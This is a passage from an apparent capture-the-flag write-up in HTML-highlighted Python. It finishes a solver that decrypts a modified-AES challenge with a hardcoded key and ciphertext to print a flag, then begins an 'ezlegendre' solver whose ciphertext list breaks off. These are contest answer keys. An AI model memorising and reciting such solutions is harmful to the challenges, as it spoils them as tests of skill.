	[<span class="hljs-number">0x51</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xd2</span>],
	[<span class="hljs-number">0xcd</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>],
	[<span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0xdb</span>],
	[<span class="hljs-number">0xe0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x79</span>],
	[<span class="hljs-number">0xe7</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0xea</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x08</span>],
	[<span class="hljs-number">0xba</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x8a</span>],
	[<span class="hljs-number">0x70</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x9e</span>],
	[<span class="hljs-number">0xe1</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xdf</span>],
	[<span class="hljs-number">0x8c</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0x16</span>]
]

s_box_inv = [
	[<span class="hljs-number">0x52</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0xfb</span>],
	[<span class="hljs-number">0x7c</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xcb</span>],
	[<span class="hljs-number">0x54</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0x4e</span>],
	[<span class="hljs-number">0x08</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x25</span>],
	[<span class="hljs-number">0x72</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xd4</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0x92</span>],
	[<span class="hljs-number">0x6c</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x84</span>],
	[<span class="hljs-number">0x90</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x06</span>],
	[<span class="hljs-number">0xd0</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0xca</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0x6b</span>],
	[<span class="hljs-number">0x3a</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xea</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0xcf</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x73</span>],
	[<span class="hljs-number">0x96</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xdf</span>, <span class="hljs-number">0x6e</span>],
	[<span class="hljs-number">0x47</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0xb7</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x1b</span>],
	[<span class="hljs-number">0xfc</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xf4</span>],
	[<span class="hljs-number">0x1f</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x5f</span>],
	[<span class="hljs-number">0x60</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0xef</span>],
	[<span class="hljs-number">0xa0</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x61</span>],
	[<span class="hljs-number">0x17</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x7d</span>]
]

<span class="hljs-keyword">def</span> <span class="hljs-title function_">key_expansion</span>(<span class="hljs-params">grid</span>):
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span> * <span class="hljs-number">4</span>):
        r = grid[-<span class="hljs-number">4</span>:]
        <span class="hljs-keyword">if</span> i % <span class="hljs-number">4</span> == <span class="hljs-number">0</span>:
            <span class="hljs-keyword">for</span> j, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(r[<span class="hljs-number">1</span>:] + r[:<span class="hljs-number">1</span>]):
                r[j] = s_box[v &gt;&gt; <span class="hljs-number">4</span>][v &amp; <span class="hljs-number">0xf</span>] ^ (rc[i // <span class="hljs-number">4</span>] <span class="hljs-keyword">if</span> j == <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>)
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):
            grid.append(grid[-<span class="hljs-number">16</span>] ^ r[j])
    <span class="hljs-keyword">return</span> grid

<span class="hljs-keyword">def</span> <span class="hljs-title function_">add_round_key</span>(<span class="hljs-params">grid, round_key</span>):
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):
        grid[i] ^= round_key[i]

<span class="hljs-keyword">def</span> <span class="hljs-title function_">inv_sub_bytes</span>(<span class="hljs-params">grid</span>):
    <span class="hljs-keyword">for</span> i, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(grid):
        grid[i] = s_box_inv[v &gt;&gt; <span class="hljs-number">4</span>][v &amp; <span class="hljs-number">0xf</span>]
        
<span class="hljs-keyword">def</span> <span class="hljs-title function_">inv_mix_columns</span>(<span class="hljs-params">grid</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>(<span class="hljs-params">a, b</span>):
        p = <span class="hljs-number">0</span>
        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):
            <span class="hljs-keyword">if</span> b &amp; <span class="hljs-number">1</span>: p ^= a
            hi_bit = a &amp; <span class="hljs-number">0x80</span>
            a = (a &lt;&lt; <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xff</span>
            <span class="hljs-keyword">if</span> hi_bit: a ^= <span class="hljs-number">0x1b</span>
            b &gt;&gt;= <span class="hljs-number">1</span>
        <span class="hljs-keyword">return</span> p

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">inv_mix_column</span>(<span class="hljs-params">c</span>):
        <span class="hljs-keyword">return</span> [
            mul(c[<span class="hljs-number">0</span>], <span class="hljs-number">0x0e</span>) ^ mul(c[<span class="hljs-number">1</span>], <span class="hljs-number">0x0b</span>) ^ mul(c[<span class="hljs-number">2</span>], <span class="hljs-number">0x0d</span>) ^ mul(c[<span class="hljs-number">3</span>], <span class="hljs-number">0x09</span>),
            mul(c[<span class="hljs-number">0</span>], <span class="hljs-number">0x09</span>) ^ mul(c[<span class="hljs-number">1</span>], <span class="hljs-number">0x0e</span>) ^ mul(c[<span class="hljs-number">2</span>], <span class="hljs-number">0x0b</span>) ^ mul(c[<span class="hljs-number">3</span>], <span class="hljs-number">0x0d</span>),
            mul(c[<span class="hljs-number">0</span>], <span class="hljs-number">0x0d</span>) ^ mul(c[<span class="hljs-number">1</span>], <span class="hljs-number">0x09</span>) ^ mul(c[<span class="hljs-number">2</span>], <span class="hljs-number">0x0e</span>) ^ mul(c[<span class="hljs-number">3</span>], <span class="hljs-number">0x0b</span>),
            mul(c[<span class="hljs-number">0</span>], <span class="hljs-number">0x0b</span>) ^ mul(c[<span class="hljs-number">1</span>], <span class="hljs-number">0x0d</span>) ^ mul(c[<span class="hljs-number">2</span>], <span class="hljs-number">0x09</span>) ^ mul(c[<span class="hljs-number">3</span>], <span class="hljs-number">0x0e</span>),
        ]

    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>, <span class="hljs-number">4</span>):
        grid[i:i + <span class="hljs-number">4</span>] = inv_mix_column(grid[i:i + <span class="hljs-number">4</span>])

<span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">block, expanded_key</span>):
    add_round_key(block, expanded_key[-<span class="hljs-number">16</span>:])
    inv_sub_bytes(block)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):
        add_round_key(block, expanded_key[i * <span class="hljs-number">16</span> : (i+<span class="hljs-number">1</span>) * <span class="hljs-number">16</span>])
        inv_mix_columns(block)
        inv_sub_bytes(block)
    add_round_key(block, expanded_key[:<span class="hljs-number">16</span>])
    <span class="hljs-keyword">return</span> block

<span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_decrypt</span>(<span class="hljs-params">key, ciphertext</span>):
    expanded = key_expansion(<span class="hljs-built_in">bytearray</span>(key))
    b = <span class="hljs-built_in">bytearray</span>(ciphertext)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(b), <span class="hljs-number">16</span>):
        b[i:i + <span class="hljs-number">16</span>] = decrypt(b[i:i + <span class="hljs-number">16</span>], expanded)
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(b)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    key = <span class="hljs-string">b&#x27;Slightly different from the AES.&#x27;</span>
    enc = <span class="hljs-string">b&#x27;%\\x98\\x10\\x8b\\x93O\\xc7\\xf02F\\xae\\xedA\\x96\\x1b\\xf9\\x9d\\x96\\xcb\\x8bT\\r\\xd31P\\xe6\\x1a\\xa1j\\x0c\\xe6\\xc8&#x27;</span>

    decrypted_flag = aes_decrypt(key, enc)
    <span class="hljs-built_in">print</span>(decrypted_flag)
</code></pre></div>
<h3 class="md-h md-h3" id="ezlegendre"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">ezlegendre</span></h3>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">137 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes

p = <span class="hljs-number">258669765135238783146000574794031096183</span>
a = <span class="hljs-number">144901483389896508632771215712413815934</span>
ciphertext = [
    <span class="hljs-number">102230607782303286066661803375943337852</span>, <span class="hljs-number">196795077203291879584123548614536291210</span>, <span class="hljs-number">41820965969318717978206410470942308653</span>,
    <span class="hljs-number">207485265608553973031638961376379316991</span>, <span class="hljs-number">126241934830164184030184483965965358511</span>, <span class="hljs-number">20250852993510047910828861636740192486</span>,
    <span class="hljs-number">103669039044817273633962139070912140023</span>, <span class="hljs-number">97337342479349334554052986501856387313</span>, <span class="hljs-number">159127719377115088432849153087501377529</span>,
    <span class="hljs-number">45764236700940832554086668329121194445</span>, <span class="hljs-number">35275004033464216369574866255836768148</span>, <span class="hljs-number">52905563179465420745275423120979831405</span>,
    <span class="hljs-number">17032180473319795641143474346227445013</span>, <span class="hljs-number">29477780450507011415073117531375947096</span>, <span class="hljs-number">55487351149573346854028771906741727601</span>,
    <span class="hljs-number">121576510894250531063152466107000055279</span>, <span class="hljs-number">69959515052241122548546701060784004682</span>, <span class="hljs-number">173839335744520746760315021378911211216</span>,
    <span class="hljs-number">28266103662329817802592951699263023295</span>, <span class="hljs-number">194965730205655016437216590690038884309</span>, <span class="hljs-number">208284966254343254016582889051763066574</span>,
    <span class="hljs-number">137680272193449000169293006333866420934</span>, <span class="hljs-number">250634504150859449051246497912830488025</span>, <span class="hljs-number">124228075953362483108097926850143387433</span>,
    <span class="hljs-number">232956176229023369857830577971626577196</span>, <span class="hljs-number">149441784891021006224395235471825205661</span>, <span class="hljs-number">118758326165875568431376314508740278934</span>,
    <span class="hljs-number">222296215466271835013184903421917936512</span>, <span class="hljs-number">49132466023594939909761224481560782731</span>, <span class="hljs-number">406286678537520849308828749751513339</span>,
    <span class="hljs-number">215122152883292859254246948661946520324</span>, <span class="hljs-number">81283590250399459209567683991648438199</span>, <span class="hljs-number">150395133067480380674905743031927410663</span>,
    <span class="hljs-number">5710878479977467762548400320726575491</span>, <span class="hljs-number">83627753774286426170934105100463456109</span>, <span class="hljs-number">164968224377869331545649899270867630850</span>,
    <span class="hljs-number">241057183685774160581265732812497247167</span>, <span class="hljs-number">109136287048010096863680430193408099828</span>, <span class="hljs-number">116313129605409961931811582899075031153</span>,
    <span class="hljs-number">202739016625709380026000805340243458300</span>, <span class="hljs-number">25408225921774957745573142542576755590</span>, <span class="hljs-number">151336258796933656160956289529558246702</span>,
    <span class="hljs-number">2947189044370494063643525166023973095</span>, <span class="hljs-number">228678413963736672394976193093568181979</span>, <span class="hljs-number">40627063032321835707220414670018641024</span>,
    <span class="hljs-number">55446789315226949622969082042881319148</span>, <span class="hljs-number">32219108726651509070669836923591948459</span>, <span class="hljs-number">134454924722414419191920784435633637634</span>,
    <span class="hljs-number">97952023967728640730045857104376826039</span>, <span class="hljs-number">20659076942504417479953787092276592682</span>, <span class="hljs-number">93281761173713729777326842152860901050</span>,
    <span class="hljs-number">133634773495582264000160065317239987936</span>, <span class="hljs-number">79976720152435218818731114555425458470</span>, <span class="hljs-number">234654694673289327542859971371886984118</span>,
    <span class="hljs-number">51332273108989067644245919615090753756</span>, <span class="hljs-number">134120280423303717489979349737802826605</span>, <span class="hljs-number">182001158305920226320085758522717203725</span>,
    <span class="hljs-number">98408798757865562737462169470346158516</span>, <span class="hljs-number">78200435603900368619334272308272773797</span>, <span class="hljs-number">232796357836930341547987600782979821555</span>,
    <span class="hljs-number">589106968861493082018132081244848952</span>, <span class="hljs-number">24186003230092331554886767628744415123</span>, <span class="hljs-number">236070626491251466741246103662922841423</span>,
    <span class="hljs-number">238699080882667864827094121849090696547</span>, <span class="hljs-number">141659873734297659078160283051728812410</span>, <span class="hljs-number">228977113517120063860252637394240795552</span>,
    <span class="hljs-number">236613527842969921794004708284265628300</span>, <span class="hljs-number">145522034982744654991661857596541755396</span>, <span class="hljs-number">249608374387044047328725156440984678776</span>,
    <span class="hljs-number">325110572051913836681821746093704556</span>, <span class="hljs-number">171492052199838424502681030556098576483</span>, <span class="hljs-number">156498865212994371079795360268866413702</span>,
    <span class="hljs-number">196747701509389071931992996873572785043</span>, <span class="hljs-number">70811811603137896158765356680364490781</span>, <span class="hljs-number">83672551582385607422240464086955462541</span>,
    <span class="hljs-number">117961603623637997457153763936550310698</span>, <span class="hljs-number">224448821395214505399297116719025174412</span>, <span class="hljs-number">4598815373009554321735225938200807251</span>,
    <span class="hljs-number">194892269604260726530091473301914449005</span>, <span class="hljs-number">127484628022155760909820605666827662175</span>, <span class="hljs-number">208706240846212140439291547368645656474</span>,
    <span class="hljs-number">14102286481104997303651684152195298336</span>, <span class="hljs-number">6129503335471304345451795609683770657</span>, <span class="hljs-number">103799668048593149396277157385628834185</span>,
    <span class="hljs-number">185813375481410513002496683918106238351</span>, <span class="hljs-number">233491689316882978147517340230794025796</span>, <span class="hljs-number">46274083097168831187719988888816378961</span>,
    <span class="hljs-number">119487551553664772614629936285345836934</span>, <span class="hljs-number">84340029922118279362389419277915602509</span>, <span class="hljs-number">88253743193124528032223101368846247085</span>,
    <span class="hljs-number">227895357640018330099501504941388167432</span>, <span class="hljs-number">92189947144174433744195727086236905626</span>, <span class="hljs-number">83114957902192791332190922428847199876</span>,
    <span class="hljs-number">173535754090441937731619031520699325122</span>, <span class="hljs-number">192309407933789484835602071782330798398</span>, <span class="hljs-number">255421921600128994923738650157598053776</span>,
    <span class="hljs-number">155535082468314012733563336837641958625</span>, <span class="hljs-number">49064798421022327310707074253263463055</span>, <span class="hljs-number">161216416471071644769301963857685054031</span>,
    <span class="hljs-number">252480348817188872515008985698620059851</span>, <span class="hljs-number">75854882798183185741756645038434215611</span>, <span class="hljs-number">256065006192683011190132982128640682537</span>,
    <span class="hljs-number">87507510173514424105732562474643251223</span>, <span class="hljs-number">163309795132131534875147566536485288212</span>, <span class="hljs-number">253583084320404985699510129361746869059</span>,
    <span class="hljs-number">253300112521651972637580307326576568313</span>, <span class="hljs-number">239027717080729650738678032571840680727</span>, <span class="hljs-number">117444657686971615526398894470673026034</span>,
    <span class="hljs-number">215470942802874046857958621181684551426</span>, <span class="hljs-number">58767098748728136687851735836323448020</span>, <span class="hljs-number">249357164697409977883764098879705065535</span>,
    <span class="hljs-number">174705348385893117518084017669958647345</span>, <span class="hljs-number">211108767177375215605155301209259781232</span>, <span class="hljs-number">57829566748907062397366819001461941421</span>,
    <span class="hljs-number">88265742700024922112974862134385921564</span>, <span class="hljs-number">80952107622167923709226013231566882261</span>, <span class="hljs-number">236078582132483864916117213281193714198</span>,
    <span class="hljs-number">193448482646563141692726575550417225891</span>, <span class="hljs-number">245972799166806058223048506073553726233</span>, <span class="hljs-number">10132977708896091601871557249244373666</span>,
    <span class="hljs-number">201785418152654519825849206312616081028</span>, <span class="hljs-number">15169816744048531212384271865884567710</span>, <span class="hljs-number">122545328290385950043826822277924297182</span>,
    <span class="hljs-number">202918646192255177261567701479991753600</span>, <span class="hljs-number">32696887488223731055835744711207261936</span>, <span class="hljs-number">88319352182963224921157305627381030375</span>,
    <span class="hljs-number">92381505322264045777004475690398861771</span>, <span class="hljs-number">189745654013352563126968415157143821842</span>, <span class="hljs-number">152254915005998949299817641843658795579</span>,
    <span class="hljs-number">198032433618991362619448347415342295581</span>, <span class="hljs-number">84073892809321676935569114878067118319</span>, <span class="hljs-number">82243805869584256211699602267760745768</span>,
    <span class="hljs-number">61994229948266781537191603999495995852</span>, <span class="hljs-number">253668765227759797787675352833142466255</span>, <span class="hljs-number">38865376724677211964966907748953557125</span>,
    <span class="hljs-number">134615436811268347303232550777225944929</span>, <span class="hljs-number">176932422465426107783498083830285780588</span>, <span class="hljs-number">207573742393618910694054452362826628208</span>,
    <span class="hljs-number">200033130835394442710748301293534928706</span>, <span class="hljs-number">127536063935293533700918451145963158658</span>, <span class="hljs-number">219125698281820710910675956971948816959</span>,
    <span class="hljs-number">179795893258398750139395156587561075767</span>, <span class="hljs-number">69649628109726874051635160004398498964</span>, <span class="hljs-number">241433717681314766463039563422535023524</span>,
    <span class="hljs-number">202664264135718511331695232476272832350</span>, <span class="hljs-number">205151096657425932591242432052912914182</span>, <span class="hljs-number">210305712465948130683966275157181140301</span>,
    <span class="hljs-number">196555690055906934925300527324955477733</span>, <span class="hljs-number">66817932643964538216259564711698986077</span>, <span class="hljs-number">95270796440975607179107356182889534333</span>,
    <span class="hljs-number">123226880424532374188134357659879826495</span>, <span class="hljs-number">53506495440223773538415807620524749240</span>, <span class="hljs-number">19253217887083870834249774316467647628</span>,
    <span class="hljs-number">165699356396365023442008488156823647206</span>, <span class="hljs-number">107809175498119862854792975070673056027</span>, <span class="hljs-number">250453989887421415931162217952559757164</span>,
    <span class="hljs-number">171492052199838424502681030556098576483</span>, <span class="hljs-number">133778166882550119563444625306816232463</span>, <span class="hljs-number">149009301604122447269581792013291889175</span>,
    <span class="hljs-number">9982418254629616281350713836647603294</span>, <span class="hljs-number">203486292122499140756846060502464655972</span>, <span class="hljs-number">157686696123400087437836943220926921848</span>,
